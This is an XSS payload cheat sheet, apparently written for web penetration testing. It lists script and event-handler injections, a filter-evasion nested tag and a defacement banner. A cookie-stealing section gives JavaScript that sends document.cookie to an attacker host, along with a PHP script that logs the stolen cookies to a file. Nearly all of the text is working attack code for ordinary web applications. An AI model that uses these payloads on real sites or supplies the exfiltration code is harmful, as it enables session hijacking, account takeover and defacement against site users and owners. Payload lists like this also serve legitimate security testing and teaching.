## XSS ##

# Injecting harmless tags
<i>, <pre>, <plaintext>

# Cheatseet HTML / JavaScript code
<script>alert('XSS')</script>
"><script>"
\";alert('XSS');//
<img src="/asdasd" onerror="alert('XSS vulnerable')">
<img src="/asdasd" onerror="alert(document.cookie)"/>
<img src="/asdasd" onclick="alert(document.cookie)">
<img src="blabla" onerror="javascript:alert('test')"/>
<img src="x" onerror="javascript:alert('XSS vulnerable')//" "="">
<img src="a" onerror="alert(document.cookie)"></img>
<body onload="alert('XSS vulnerable')">
<scr<script>ipt>alert('XSS vulnerable')</scr</script>ipt>
<b onmouseover=alert('Hi')>Click Me!</b>
<svg onload="alert('XSS vulnerable')">
\><svg onload="alert(0)">
"><body bgcolor="black"> <font color="red" size="5"><marquee>Breaking News: This Site is hacked!!!!</marquee> </font> <font color="blue"> <center><h1>=[Hacked]=</h1> <h2> =[by]=</h2></center> <center><h1>=[0x00theZer0]=</h1></center>


# Reflected XSS attacks, when the malicious payload is carried inside the request.
http://target.site/search.php?find=<payload>

# Persistent XSS attacks, occur when the payload is sent to the vulnerable web server and then stored.

## Cookie Stealing ##

# Send cookies content to an attacker-controlled site
<script>
var i = new Image();
i.src = "http://attacker.site/log.php?q="+document.cookie;
</script>

# Use log.php script to save the cookie in a text file on attacker.site
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>

